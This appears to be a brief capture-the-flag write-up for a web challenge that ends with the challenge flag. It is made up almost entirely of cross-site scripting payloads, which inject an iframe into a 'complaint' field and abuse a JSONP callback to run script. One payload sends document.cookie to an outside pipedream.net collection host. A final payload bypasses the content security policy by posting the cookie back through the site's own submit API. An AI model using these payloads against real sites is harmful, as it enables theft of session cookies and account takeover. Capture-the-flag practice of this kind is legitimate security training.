```json
{"complaint":"<iframe src='http://127.0.0.1:1337/list?callback=alert(1)%3bdisplay'></iframe>"}
```

```js
fetch("https://eny9my3bovulxfd.m.pipedream.net/?f="+document.cookie[0])
```

```json
{"complaint":"<iframe src='http://127.0.0.1:1337/list?callback=fetch(\"https://eny9my3bovulxfd.m.pipedream.net/?f=${document.cookie[0]}\")%3bdisplay'></iframe>"}
```
Doesnt work because of CSP

```js
fetch("/api/submit", {method:"POST",body: JSON.stringify({complaint: document.cookie[0]}), headers: {'Content-Type': 'application/json'}})
```

```json
{"complaint":"<iframe src='http://127.0.0.1:1337/list?callback=fetch(\"/api/submit\", {method:\"POST\",body: JSON.stringify({complaint: document.cookie}), headers: {\"Content-Type\": \"application/json\"}})%3bdisplay'></iframe>"}
```

`CHTB{CSP_4nd_Js0np_d0_n0t_alw4ys_g3t_al0ng}`

